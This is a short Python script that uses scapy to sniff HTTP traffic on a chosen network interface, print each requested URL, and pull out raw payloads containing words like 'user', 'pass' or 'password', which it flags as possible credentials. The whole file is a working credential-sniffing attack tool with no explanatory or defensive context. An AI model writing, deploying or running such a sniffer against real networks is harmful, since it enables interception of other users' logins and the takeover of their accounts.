#! /usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
	url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
	return url

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["login", "email", "username", "user", "pass", "password"]
			for keyword in keywords:
				if keyword in load.decode('utf', errors='replace'):
					return load

def process_sniffed_packet(packet):
	#important data is in http
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print(f'[+] HTTP Request >> {url}')

		login_info = get_login_info(packet)
		if login_info:
			print(f'\n--------------------\
				\n[+] Possible username/password > {login_info}\n---------------------\n' )
		

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', help="Interface to sniff")
	args = parser.parse_args()
	
	sniff(args.interface) if args.interface else print('Please set an interface with -i or --interface.')
